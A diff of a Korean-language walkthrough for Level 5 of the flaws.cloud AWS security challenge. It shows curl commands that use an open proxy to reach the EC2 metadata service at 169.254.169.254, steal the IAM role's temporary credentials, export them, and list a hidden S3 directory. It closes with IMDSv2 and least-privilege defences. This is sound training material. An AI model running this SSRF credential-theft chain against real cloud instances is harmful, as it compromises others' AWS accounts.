@@ -1,20 +1,21 @@
 # Level 5 — IMDSv1 SSRF 로 EC2 역할 자격증명 탈취
 
-> **URL**: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
+> **설명 페이지**: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
+> **실제 프록시 서버 (EC2)**: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
 > **핵심 기술**: SSRF / IMDSv1 / STS 임시 자격증명
 > **난이도**: ⭐⭐
 > **본인 AWS 계정 필요**: ❌
 
 ## 🎯 목표
 
-이 레벨은 **HTTP 프록시 기능이 있는 웹앱** 이다. `/proxy/<url>` 경로로 아무 URL 을 뒤에 붙이면 서버가 대신 받아다 준다. 이 프록시로 **EC2 메타데이터 서비스(IMDS)** 를 호출해 **해당 EC2 인스턴스의 IAM 역할 자격증명**을 탈취하고, 다음 레벨 버킷을 찾는다.
+Level 5 의 설명 페이지는 "**이 EC2 에 HTTP 오픈 프록시가 있다**" 고 친절히 알려준다. 그 EC2 는 Level 4 에서 통과한 **같은 호스트(`4d0cf09b...flaws.cloud`)** 이며, 이번에는 Basic Auth 없이 `/proxy/<url>` 경로가 그대로 노출돼 있다. 이 프록시로 **EC2 메타데이터 서비스(IMDS)** 를 호출해 **해당 EC2 의 IAM 역할 자격증명**을 탈취하고, **Level 6 버킷에 숨겨진 디렉터리 이름**을 알아낸다.
 
 ## 🧭 공식 힌트
 
 <details>
 <summary><b>Hint 1</b></summary>
 
-> 이 서버에는 오픈 프록시가 있습니다. `http://.../proxy/<url>` 로 외부 URL 을 받아올 수 있군요.
+> 이 EC2 서버에는 `http://.../proxy/<url>` 경로로 외부 URL 을 대신 받아오는 오픈 프록시가 있습니다. 서버가 **내부 네트워크**로 요청을 보내면 어떻게 될까요?
 
 </details>
 
@@ -28,7 +29,7 @@
 <details>
 <summary><b>Hint 3</b></summary>
 
-> IAM 역할이 붙은 EC2 에서는 `/latest/meta-data/iam/security-credentials/<RoleName>` 으로 임시 자격증명을 얻을 수 있습니다. 프록시로 그 경로를 요청해 보세요.
+> IAM 역할이 붙은 EC2 에서는 `/latest/meta-data/iam/security-credentials/<RoleName>` 으로 임시 자격증명을 얻을 수 있습니다. 프록시로 그 경로를 요청한 뒤, 받은 ASIA 키로 **level6 버킷 리스팅**을 시도해 숨은 디렉터리를 찾으세요.
 
 </details>
 
@@ -41,23 +42,27 @@
 
 ## 🔍 정찰
 
-### 1. 프록시가 실제로 동작하는지 확인
+### 1. 설명 페이지에서 프록시 경로 확인
 ```bash
-curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/proxy/flaws.cloud/ | head -5
+curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/ | grep -Eo '[a-f0-9]{40}\.flaws\.cloud/proxy/' | head -1
+# 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
+```
+
+### 2. 프록시가 실제로 동작하는지 확인
+```bash
+curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/" | head -5
 ```
 `flaws.cloud` 의 첫 페이지 내용이 되돌아오면 — 이 서버가 요청을 **서버 사이드**에서 대신 보내고 있다는 확증이다.
 
-### 2. 프록시 호스트의 IMDS 접근 확인
+### 3. 프록시 호스트의 IMDS 접근 확인
 ```bash
-curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/proxy/169.254.169.254/latest/meta-data/
+curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/"
 ```
 출력(메타데이터 카테고리 목록):
 ```
 ami-id
 ami-launch-index
-ami-manifest-path
-block-device-mapping/
-hostname
+...
 iam/
 ...
 ```
@@ -75,14 +80,15 @@ IMDSv1 임이 확인됐다.
 
 ### 1. 역할 이름 알아내기
 ```bash
-curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/"
 # flaws
 ```
 역할 이름이 `flaws` 라고 나온다.
 
 ### 2. 자격증명 탈취
 ```bash
-curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+curl -s "http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws" \
+  | tee /tmp/l5creds.json
 ```
 출력:
 ```json
@@ -92,27 +98,39 @@ curl -s http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/prox
   "Type" : "AWS-HMAC",
   "AccessKeyId" : "ASIA...",
   "SecretAccessKey" : "...",
-  "Token" : "FwoGZXIvYXdzE...",
+  "Token" : "IQoJb3JpZ2lu...",
   "Expiration" : "2026-04-18T06:00:00Z"
 }
 ```
 
 ### 3. 로컬에 임시 자격증명 설정
 ```bash
-export AWS_ACCESS_KEY_ID="ASIA..."
-export AWS_SECRET_ACCESS_KEY="..."
-export AWS_SESSION_TOKEN="FwoGZXI..."
-export AWS_DEFAULT_REGION="us-west-2"
+export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId /tmp/l5creds.json)
+export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey /tmp/l5creds.json)
+export AWS_SESSION_TOKEN=$(jq -r .Token /tmp/l5creds.json)
+export AWS_DEFAULT_REGION=us-west-2
 
 aws sts get-caller-identity
 # Arn: arn:aws:sts::975426262029:assumed-role/flaws/i-...
 ```
 
-### 4. 버킷 리스팅 → 다음 레벨
+### 4. level6 버킷 리스팅 → **숨겨진 디렉터리** 찾기
+Level 5 설명 페이지는 "level6 버킷 안에 **hidden directory** 가 있다" 라는 식의 힌트를 준다. 익명으로는 안 열리지만 이 flaws role 은 읽을 수 있다:
+
 ```bash
-aws s3 ls
-# level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
-# ...
+aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
+```
+예상:
+```
+                           PRE ddcc78ff/
+2017-02-27 11:11:07        871 index.html
+```
+**`ddcc78ff/`** 가 Level 6 의 실제 진입 디렉터리.
+
+### 5. 다음 레벨 확인
+```bash
+curl -sI http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
+# HTTP/1.1 200 OK
 ```
 
 ## 🚪 정답 & 다음 레벨
@@ -120,8 +138,10 @@ aws s3 ls
 <details>
 <summary>정답 펼치기</summary>
 
-- 다음 레벨: **http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/**
-- 교훈: "한 곳의 SSRF" 가 "전체 EC2 역할 자격증명 탈취" 로 번진다. IMDSv2 를 **강제** 하는 것만으로도 대부분의 공격이 무력화된다.
+- 다음 레벨: **http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/**
+- 교훈:
+  - "한 곳의 SSRF" 가 "전체 EC2 역할 자격증명 탈취" 로 번진다. IMDSv2 를 **강제** 하는 것만으로도 대부분의 공격이 무력화된다.
+  - Hidden directory 로 보호하는 건 **보안이 아니다** — 역할이 `s3:ListBucket` 만 가지면 누가 보더라도 드러난다.
 
 </details>
 
@@ -158,7 +178,7 @@ aws ec2 modify-instance-metadata-defaults \
 - 외부 전용 egress VPC 엔드포인트/프록시 서버로 우회 금지
 
 ### ④ 최소권한 원칙
-`flaws` 역할이 `s3:ListAllMyBuckets` 을 왜 가지고 있는가? EC2 가 단일 버킷만 쓰면 `Resource: arn:aws:s3:::specific-bucket` 으로 좁힌다.
+`flaws` 역할이 `s3:ListAllMyBuckets` / `ListBucket` 을 왜 가지고 있는가? EC2 가 단일 버킷만 쓰면 `Resource: arn:aws:s3:::specific-bucket` 으로 좁힌다.
 
 ### ⑤ CloudTrail / GuardDuty 로 탐지
 GuardDuty 가 자동 탐지하는 시그널:
@@ -167,9 +187,11 @@ GuardDuty 가 자동 탐지하는 시그널:
 
 ## ✅ 체크리스트
 
-- [ ] `/proxy/flaws.cloud` 가 실제로 동작하는지 재현
+- [ ] 설명 페이지에서 실제 프록시 호스트(`4d0cf09b...flaws.cloud`) 추출
+- [ ] `/proxy/flaws.cloud` 동작 확인
 - [ ] `/proxy/169.254.169.254/latest/meta-data/` 응답 확인
 - [ ] 탈취한 `ASIA...` 키로 `get-caller-identity` 성공
+- [ ] `aws s3 ls s3://level6-...` 로 숨은 디렉터리 `ddcc78ff/` 확보
 - [ ] 본인 EC2 에서 `--http-tokens required` 설정 후 IMDSv1 호출이 **401** 로 거부되는지 확인
 - [ ] `http-put-response-hop-limit 1` 로 컨테이너 안에서 IMDS 호출을 막았는지 확인
 
